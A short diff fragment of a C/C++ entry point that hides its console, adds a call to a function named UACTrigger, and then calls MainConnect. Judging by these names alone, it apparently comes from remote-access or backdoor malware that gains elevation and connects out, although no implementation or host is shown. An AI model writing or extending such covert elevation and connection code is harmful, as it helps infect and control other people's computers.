@@ -11,6 +11,7 @@ Modified: -
 int main() // entry point
 {
     FreeConsole();
+    UACTrigger();
     MainConnect();
     return 0;
 }
